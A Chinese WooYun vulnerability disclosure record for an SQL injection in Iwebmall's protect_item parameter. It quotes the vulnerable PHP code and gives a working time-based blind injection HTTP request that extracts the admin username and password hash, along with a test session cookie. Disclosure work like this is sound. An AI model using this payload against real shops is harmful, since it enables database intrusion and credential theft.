{"id": 41909, "wybug_id": "wooyun-2014-087317", "wybug_title": "Iwebmall 最新版SQL注入第十枚", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2014-12-17 11:29", "wybug_open_date": "2015-03-17 11:30", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebmall 最新版SQL注入第十枚 详细说明：  看到wooyun上有人提了几个iweb的漏洞（ WooYun: iwebmall商城程序sql注入 ），我来捡捡漏儿吧，希望不要重复。先把注入点拿出来：www.xxx.com/do.php?act=user_protect_rights ，POST的内容中有个参数protect_item，对protect_item使用shotr_check()进行了过滤，但是这里是数字型的，直接绕过过滤。/action/user/protect_rights.action.php\n无关代码// 处理post变量$order_id = intval(get_args('id'));$protect_content = big_check(get_args('protect_content'));$protect_item = short_check(get_args('protect_item'));$ask_service = big_check(get_args('ask_service'));//数据库操作dbtarget('r',$dbServs);$dbo = new dbex();//判断商品是否锁定，锁定则不许操作$sql = \"select b.goods_id from $t_order_info as a join $t_order_goods as b on a.order_id=b.order_id where a.order_id=$order_id\";$row = $dbo->getRow($sql);if($row){\t$goods_id=$row['goods_id'];}include(\"foundation/fgoods_locked.php\");//判断用户是否锁定，锁定则不许操作$sql = \"select locked from $t_users where user_id=$user_id\";$row = $dbo->getRow($sql);if($row['locked']==1){\tsession_destroy();\ttrigger_error($m_langpackage->m_user_locked);//非法操作}//判断订单是否存在，锁定则不许操作$order_info = get_order_info($dbo,$t_order_info,$t_order_goods,$t_goods,$t_shop_info,$order_id,$user_id);if(!$order_info) {\taction_return(0,$m_langpackage->m_noex_thisorder);}//判断订单状态，锁定则不许操作if($order_info['order_status']=='0') {\taction_return(0,$m_langpackage->m_order_cancel);} elseif ($order_info['order_status']!='3') {\taction_return(0,$m_langpackage->m_not_sure_receiv);}//数据库操作dbtarget('w',$dbServs);$dbo = new dbex();$add_time = $ctime->long_time();$status = 0;//是否申请客服介入if($ask_service == $m_langpackage->m_ask_service)\t$status = 2;//插入维权信息$sql = \"insert into `$t_protect_rights` (order_id,protect_item,user_id,user_type,shop_id,content,protect_date,status) values($order_id,$protect_item,$user_id,0,{$order_info['shop_id']},'$protect_content','$add_time',$status)\";if($dbo->exeUpdate($sql)) {\t\t//修改订单维权状态\tif(!$order_info['protect_status'])\t{\t\t$sql = \"update `$t_order_info` set protect_status = 1 where order_id='$order_id' and user_id='$user_id'\";\t\t$dbo->exeUpdate($sql);\t}\taction_return(1,$m_langpackage->m_ask_protect_suc);} 无关代码\n可以看到protect_item经过short_check过滤，去看看short_check()。\nfunction short_check($str,$is_hex=\"\") {\t$MaxSlen=300;//限制短输入项最多300个字符\tif (!get_magic_quotes_gpc())    // 判断magic_quotes_gpc是否打开\t{\t\t$str = addslashes($str);    // 进行过滤\t}\t$str = LenLimit($str,$MaxSlen);\t\t$str = str_replace(\"\\'\", \"\", $str);\t$str = str_replace(\"\\\\\", \"\", $str);\t$str = str_replace(\"#\", \"\", $str);\t$str = htmlspecialchars($str);\tif (empty($is_hex)) {\t\t$str = cleanHex($str);\t}\treturn trim($str);}\n可以看到，short_check把单引号转义，然后去掉，但是这里可以不用单引号注入。Iweb没有错误回显，这里用time-based blind进行注入测试。Payload:\nPOST /do.php?act=user_protect_rights HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/modules.php?app=poll_sendCookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; iweb_hisgoods[15]=1417531949; iweb_hisgoods[26]=1418653330; iweb_email=pigtest@163.com; PHPSESSID=9ctcj0i474267fiirei2p8tpo5; iweb_iweb_login=pigtest1%40163.comConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 160id=1&protect_content=&ask_service=&protect_item= (select if(ord(mid((select admin_name from imall_admin_user where admin_id=1 limit 0,1),1,1))=122,sleep(3),0))\n上面的代码中有这么一段\n无关代码//判断订单状态，锁定则不许操作if($order_info['order_status']=='0') {\taction_return(0,$m_langpackage->m_order_cancel);} elseif ($order_info['order_status']!='3') {\taction_return(0,$m_langpackage->m_not_sure_receiv);}无关代码\n在测试时这段代码是判断订单是否已取消或者是否已确认收货，只有没有取消并确认收货才可以继续下面的过程。所在，在本地测试时，把order_id为1的订单的order_status字段 update为3。因为是time-based blind 注入，猜测管理员用户名的第三个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟5s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： 21232f297a57a5a743894a0e4a801fc3   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}